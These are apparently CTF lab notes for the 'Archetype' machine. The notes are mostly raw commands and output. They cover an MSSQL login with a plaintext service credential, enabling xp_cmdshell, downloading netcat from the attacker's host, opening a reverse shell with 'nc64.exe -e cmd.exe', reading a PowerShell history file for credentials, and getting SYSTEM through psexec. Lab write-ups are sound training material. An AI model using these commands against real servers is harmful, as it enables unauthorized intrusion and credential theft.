# archetype

## impacket-mssql

```shell
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.45.187 -windows-auth
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd"
output                
-------------------   
NULL                  
Path                  
----                  
C:\Windows\system32   
NULL                  
NULL                  
NULL                  
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc   
NULL  
```

```shell
SELECT is_srvrolemember('sysadmin');
```

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet


```shell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```shell
python3 -m http.server 80
```

```shell
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{my_ip}/nc64.exe -outfile nc64.exe"
```

```shell
nc -lvnp 443
```

```shell
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
{my_IP} 443"
```

```shell
python3 -m http.server 80
```

```shell
powershell
wget http://{my_IP}/winPEASx64.exe -outfile winPEASx64.exe
```

```shell
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```
```shell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```shell
┌──(kali㉿kali)-[/usr/share/peass/winpeas]
└─$ impacket-psexec administrator@10.129.45.187
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.45.187.....
[*] Found writable share ADMIN$
[*] Uploading file OlVeeKNU.exe
[*] Opening SVCManager on 10.129.45.187.....
[*] Creating service ENGS on 10.129.45.187.....
[*] Starting service ENGS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```